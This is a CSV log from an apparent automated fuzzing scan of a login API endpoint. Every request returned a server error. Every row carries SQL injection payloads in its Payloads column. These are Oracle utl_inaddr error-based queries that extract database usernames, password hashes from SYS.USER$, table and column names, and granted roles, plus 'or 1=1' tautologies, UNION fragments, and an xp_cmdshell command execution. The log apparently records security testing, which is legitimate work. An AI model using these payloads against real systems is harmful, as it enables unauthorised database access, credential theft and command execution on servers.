Task ID,Message Type,Req. Timestamp,Method,URL,Code,Reason,RTT,Size Req. Header,Size Req. Body,Size Resp. Header,Size Resp. Body,Highest Alert,State,Payloads
939,Fuzzed,Sat Jan 11 17:02:54 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,115,633,203,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1)) AND 'i'='i, anything' or 'x'='x]"
926,Fuzzed,Sat Jan 11 17:02:53 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,358,633,188,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(GRANTED_ROLE)) FROM DBA_ROLE_PRIVS WHERE GRANTEE=SYS.LOGIN_USER)) AND 'i'='i, x' or full_name like '%bob%]"
941,Fuzzed,Sat Jan 11 17:02:54 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,113,633,216,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1)) AND 'i'='i, x' and members.email is NULL; --]"
942,Fuzzed,Sat Jan 11 17:02:54 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,111,633,211,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1)) AND 'i'='i, x' or full_name like '%bob%]"
944,Fuzzed,Sat Jan 11 17:02:54 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,79,633,233,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1)) AND 'i'='i, '; exec master..xp_cmdshell 'ping 172.10.1.255'--]"
943,Fuzzed,Sat Jan 11 17:02:54 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,116,633,197,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1)) AND 'i'='i, 23 or 1=1; --]"
934,Fuzzed,Sat Jan 11 17:02:54 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,369,633,185,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1)) AND 'i'='i, ?]"
947,Fuzzed,Sat Jan 11 17:02:54 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,77,633,185,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=1)) AND 'i'='i, a' --]"
945,Fuzzed,Sat Jan 11 17:02:54 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,112,633,181,544,14,,Reflected,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=1)) AND 'i'='i, a]"
946,Fuzzed,Sat Jan 11 17:02:54 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,112,633,183,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=1)) AND 'i'='i, a' ]"
948,Fuzzed,Sat Jan 11 17:02:54 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,114,633,193,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=1)) AND 'i'='i, a' or 1=1; --]"
950,Fuzzed,Sat Jan 11 17:02:54 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,79,633,181,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=1)) AND 'i'='i, ?]"
935,Fuzzed,Sat Jan 11 17:02:54 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,440,633,204,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1)) AND 'i'='i, ' and 1=0) union all]"
951,Fuzzed,Sat Jan 11 17:02:54 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,120,633,200,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=1)) AND 'i'='i, ' and 1=0) union all]"
953,Fuzzed,Sat Jan 11 17:02:54 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,111,633,205,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=1)) AND 'i'='i, x' and userid is NULL; --]"
940,Fuzzed,Sat Jan 11 17:02:54 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,428,633,227,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1)) AND 'i'='i, x' and 1=(select count(*) from tabname); --]"
955,Fuzzed,Sat Jan 11 17:02:54 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,122,633,199,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=1)) AND 'i'='i, anything' or 'x'='x]"
956,Fuzzed,Sat Jan 11 17:02:54 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,113,633,223,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=1)) AND 'i'='i, x' and 1=(select count(*) from tabname); --]"
959,Fuzzed,Sat Jan 11 17:02:54 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,122,633,193,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=1)) AND 'i'='i, 23 or 1=1; --]"
949,Fuzzed,Sat Jan 11 17:02:54 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,368,633,181,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=1)) AND 'i'='i, @]"
954,Fuzzed,Sat Jan 11 17:02:54 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,354,633,204,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=1)) AND 'i'='i, x' and email is NULL; --]"
962,Fuzzed,Sat Jan 11 17:02:54 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,86,633,192,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=1)) AND 'i'='i, a' ]"
952,Fuzzed,Sat Jan 11 17:02:54 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,434,633,191,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=1)) AND 'i'='i, ? or 1=1 --]"
961,Fuzzed,Sat Jan 11 17:02:54 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,126,633,190,544,14,,Reflected,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=1)) AND 'i'='i, a]"
963,Fuzzed,Sat Jan 11 17:02:54 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,77,633,194,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=1)) AND 'i'='i, a' --]"
964,Fuzzed,Sat Jan 11 17:02:54 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,88,633,202,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=1)) AND 'i'='i, a' or 1=1; --]"
965,Fuzzed,Sat Jan 11 17:02:54 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,114,633,190,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=1)) AND 'i'='i, @]"
966,Fuzzed,Sat Jan 11 17:02:54 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,123,633,190,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=1)) AND 'i'='i, ?]"
957,Fuzzed,Sat Jan 11 17:02:54 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,427,633,212,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=1)) AND 'i'='i, x' and members.email is NULL; --]"
968,Fuzzed,Sat Jan 11 17:02:54 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,86,633,200,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=1)) AND 'i'='i, ? or 1=1 --]"
958,Fuzzed,Sat Jan 11 17:02:54 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,433,633,207,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=1)) AND 'i'='i, x' or full_name like '%bob%]"
960,Fuzzed,Sat Jan 11 17:02:54 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,421,633,229,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=1)) AND 'i'='i, '; exec master..xp_cmdshell 'ping 172.10.1.255'--]"
972,Fuzzed,Sat Jan 11 17:02:55 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,87,633,232,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=1)) AND 'i'='i, x' and 1=(select count(*) from tabname); --]"
970,Fuzzed,Sat Jan 11 17:02:55 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,123,633,213,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=1)) AND 'i'='i, x' and email is NULL; --]"
971,Fuzzed,Sat Jan 11 17:02:55 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,114,633,208,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=1)) AND 'i'='i, anything' or 'x'='x]"
973,Fuzzed,Sat Jan 11 17:02:55 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,117,633,221,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=1)) AND 'i'='i, x' and members.email is NULL; --]"
974,Fuzzed,Sat Jan 11 17:02:55 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,113,633,216,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=1)) AND 'i'='i, x' or full_name like '%bob%]"
975,Fuzzed,Sat Jan 11 17:02:55 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,83,633,202,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=1)) AND 'i'='i, 23 or 1=1; --]"
977,Fuzzed,Sat Jan 11 17:02:55 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,111,633,193,544,14,,Reflected,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=1)) AND 'i'='i, a]"
976,Fuzzed,Sat Jan 11 17:02:55 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,124,633,238,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=1)) AND 'i'='i, '; exec master..xp_cmdshell 'ping 172.10.1.255'--]"
967,Fuzzed,Sat Jan 11 17:02:54 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,352,633,209,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=1)) AND 'i'='i, ' and 1=0) union all]"
983,Fuzzed,Sat Jan 11 17:02:55 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,83,633,212,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=1)) AND 'i'='i, ' and 1=0) union all]"
980,Fuzzed,Sat Jan 11 17:02:55 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,167,633,205,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=1)) AND 'i'='i, a' or 1=1; --]"
981,Fuzzed,Sat Jan 11 17:02:55 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,158,633,193,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=1)) AND 'i'='i, @]"
982,Fuzzed,Sat Jan 11 17:02:55 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,154,633,193,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=1)) AND 'i'='i, ?]"
978,Fuzzed,Sat Jan 11 17:02:55 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,227,633,195,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=1)) AND 'i'='i, a' ]"
969,Fuzzed,Sat Jan 11 17:02:55 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,427,633,214,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=1)) AND 'i'='i, x' and userid is NULL; --]"
985,Fuzzed,Sat Jan 11 17:02:55 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,86,633,217,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=1)) AND 'i'='i, x' and userid is NULL; --]"
988,Fuzzed,Sat Jan 11 17:02:55 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,110,633,235,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=1)) AND 'i'='i, x' and 1=(select count(*) from tabname); --]"
987,Fuzzed,Sat Jan 11 17:02:55 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,123,633,211,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=1)) AND 'i'='i, anything' or 'x'='x]"
989,Fuzzed,Sat Jan 11 17:02:55 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,121,633,224,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=1)) AND 'i'='i, x' and members.email is NULL; --]"
990,Fuzzed,Sat Jan 11 17:02:55 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,84,633,219,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=1)) AND 'i'='i, x' or full_name like '%bob%]"
991,Fuzzed,Sat Jan 11 17:02:55 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,111,633,205,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=1)) AND 'i'='i, 23 or 1=1; --]"
994,Fuzzed,Sat Jan 11 17:02:55 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,84,633,224,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=1)) AND 'i'='i, a' ]"
993,Fuzzed,Sat Jan 11 17:02:55 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,114,633,222,544,14,,Reflected,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=1)) AND 'i'='i, a]"
992,Fuzzed,Sat Jan 11 17:02:55 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,126,633,241,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=1)) AND 'i'='i, '; exec master..xp_cmdshell 'ping 172.10.1.255'--]"
984,Fuzzed,Sat Jan 11 17:02:55 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,347,633,203,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=1)) AND 'i'='i, ? or 1=1 --]"
995,Fuzzed,Sat Jan 11 17:02:55 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,83,633,226,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=1)) AND 'i'='i, a' --]"
979,Fuzzed,Sat Jan 11 17:02:55 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,519,633,197,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=1)) AND 'i'='i, a' --]"
996,Fuzzed,Sat Jan 11 17:02:55 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,125,633,234,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=1)) AND 'i'='i, a' or 1=1; --]"
998,Fuzzed,Sat Jan 11 17:02:55 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,118,633,222,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=1)) AND 'i'='i, ?]"
999,Fuzzed,Sat Jan 11 17:02:55 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,79,633,241,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=1)) AND 'i'='i, ' and 1=0) union all]"
1000,Fuzzed,Sat Jan 11 17:02:55 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,85,633,232,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=1)) AND 'i'='i, ? or 1=1 --]"
1001,Fuzzed,Sat Jan 11 17:02:55 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,115,633,246,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=1)) AND 'i'='i, x' and userid is NULL; --]"
986,Fuzzed,Sat Jan 11 17:02:55 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,450,633,216,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=1)) AND 'i'='i, x' and email is NULL; --]"
1004,Fuzzed,Sat Jan 11 17:02:55 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,77,633,264,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=1)) AND 'i'='i, x' and 1=(select count(*) from tabname); --]"
1002,Fuzzed,Sat Jan 11 17:02:55 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,112,633,245,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=1)) AND 'i'='i, x' and email is NULL; --]"
1005,Fuzzed,Sat Jan 11 17:02:55 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,86,633,253,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=1)) AND 'i'='i, x' and members.email is NULL; --]"
1003,Fuzzed,Sat Jan 11 17:02:55 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,122,633,240,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=1)) AND 'i'='i, anything' or 'x'='x]"
1006,Fuzzed,Sat Jan 11 17:02:55 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,113,633,248,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=1)) AND 'i'='i, x' or full_name like '%bob%]"
